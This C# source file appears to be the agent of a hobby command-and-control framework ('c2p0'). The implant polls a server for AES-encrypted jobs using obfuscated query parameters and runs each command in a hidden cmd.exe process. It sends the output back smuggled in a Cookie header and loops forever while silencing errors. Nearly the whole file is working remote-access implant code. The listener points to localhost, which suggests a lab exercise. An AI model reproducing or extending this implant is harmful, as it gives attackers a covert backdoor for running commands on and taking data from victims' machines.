using Newtonsoft.Json;
using System.Diagnostics;
using System.Security.Cryptography;

namespace c2p0.SampleAgent
{
    public class Program
    {
        static HttpClient client = new HttpClient();

        // Default listener I created on web server
        static string baseAddress = "http://localhost:7869";
        static string agentGuid = Guid.NewGuid().ToString();
        static string b64Key = "5pSrJvmwgcPrb2cUPi79r0p4mAVMoiEVRmAHDFr1Atk=";
        static string b64Iv = "wvplA2MgU/gxEbehIVCh/A==";

        internal static string Decrypt(string cipherText)
        {
            using var aesAlg = Aes.Create();
            aesAlg.Key = Convert.FromBase64String(b64Key);
            aesAlg.IV = Convert.FromBase64String(b64Iv);
            var decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

            using var ms = new MemoryStream(Convert.FromBase64String(cipherText));
            using var cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read);
            using var sr = new StreamReader(cs);
            return sr.ReadToEnd();
        }

        public class Job
        {
            public string id { get; set; }
            public string command { get; set; }
        }

        private static async void Handshake()
        {
            string request = baseAddress + "/?df2f1f3f7h6h4=n&agentGuid=" + agentGuid;
            var response = client.GetStringAsync(request);

            var msg = await response;
        }

        private static async Task<Job> GetJob()
        {
            string request = baseAddress + "/?df2f1f3f8h6h4=n&agentGuid=" + agentGuid;
            //string request = baseAddress + "/?" + Guid.NewGuid().ToString() + "=n&agentGuid=" + agentGuid;
            var response = client.GetStringAsync(request);

            var msg = await response;
            Console.WriteLine(msg);
            var testdecrypt = Decrypt(msg);
            Console.WriteLine(testdecrypt);
            return JsonConvert.DeserializeObject<Job>(testdecrypt);
        }

        private static async void CompleteJob(string jobGuid, string jobResponse)
        {
            string request = baseAddress + "/?df2f1f3f7h9h4=n&jobGuid=" + jobGuid + "&agentGuid=" + agentGuid + "&response=" + jobResponse.Substring(0, 20);
            jobResponse = jobResponse.Replace("\n", "{NEWLINE}").Replace("\r", "{TABLINE}");
            client.DefaultRequestHeaders.Clear();
            client.DefaultRequestHeaders.Add("Cookie", jobResponse);
            var response = client.GetStringAsync(request);

            var msg = await response;
        }

        private static string ExecuteCommand(string command)
        {
            string response = string.Empty;

            Process cmd = new Process();
            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.Start();

            cmd.StandardInput.WriteLine(command);
            cmd.StandardInput.Flush();
            cmd.StandardInput.Close();
            response = cmd.StandardOutput.ReadToEnd();
            cmd.WaitForExit();
            

            return response;
        }

        static async Task Main(string[] args)
        {
            System.Threading.Thread.Sleep(3000);

            // Handshake
            Handshake();

            System.Console.WriteLine("KEY: " + b64Key);
            System.Console.WriteLine("IV: " + b64Iv);

            while (true)
            {
                try
                {
                    var job = await GetJob();

                    if (job != null)
                    {
                        Console.WriteLine("got job");
                        string response = ExecuteCommand(job.command);
                        Console.WriteLine(response);
                        CompleteJob(job.id, response);
                    }

                    System.Threading.Thread.Sleep(3000);
                }
                catch
                {
                    //
                }
            }
        }
    }
}